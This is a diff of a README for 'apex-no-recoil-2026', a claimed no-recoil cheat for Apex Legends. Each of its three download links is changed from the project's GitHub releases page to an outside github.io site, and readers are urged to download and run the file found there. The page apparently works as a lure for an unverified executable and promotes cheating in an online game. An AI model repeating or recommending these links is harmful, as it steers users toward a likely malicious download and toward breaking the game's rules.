@@ -1,6 +1,6 @@
 # 🎯 apex-no-recoil-2026 - Perfect Recoil Control for Every Legend
 
-[![Download Now](https://img.shields.io/badge/Download-Apex_No_Recoil_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Apex_No_Recoil_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://judieflaring5570.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome to **apex-no-recoil-2026** – the ultimate solution for eliminating wea
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: **[https://github.com/Judieflaring5570/apex-no-recoil-2026/releases](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)**
+Visit this link to download the application: **[https://judieflaring5570.github.io](https://judieflaring5570.github.io)**
 
 Once you're on the page, look for the latest release file and download it to your computer. After the download finishes, you're ready to move to the next step.
 
@@ -121,7 +121,7 @@ This tool is designed for educational and entertainment purposes. Use it respons
 
 Ready to hit every shot? Head to the download page and take your Apex Legends gameplay to the next level today!
 
-**[⬇️ Download apex-no-recoil-2026 Now](https://github.com/Judieflaring5570/apex-no-recoil-2026/releases)**
+**[⬇️ Download apex-no-recoil-2026 Now](https://judieflaring5570.github.io)**
 
 ---
 
